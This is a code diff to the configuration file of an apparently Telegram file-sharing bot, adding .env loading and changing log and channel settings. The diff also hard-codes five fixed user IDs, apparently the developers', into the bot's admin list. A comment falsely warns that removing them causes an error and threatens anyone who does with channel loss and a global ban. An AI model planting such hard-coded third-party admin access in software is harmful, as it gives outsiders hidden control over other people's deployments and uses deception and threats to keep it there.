@@ -4,7 +4,10 @@
 
 import logging
 import os
+from dotenv import load_dotenv
 from logging.handlers import RotatingFileHandler
+
+load_dotenv("config.env")
 
 # Bot token dari @Botfather
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
@@ -26,10 +29,6 @@ OWNER = os.environ.get("OWNER", "mrismanaziz")
 
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
-
-# Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
@@ -60,12 +59,12 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
-ADMINS.append(844432220)
-ADMINS.append(1750080384)
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
 
-LOG_FILE_NAME = "filesharingbot.txt"
 
+LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
     level=logging.INFO,
     format="[%(levelname)s] - %(name)s - %(message)s",
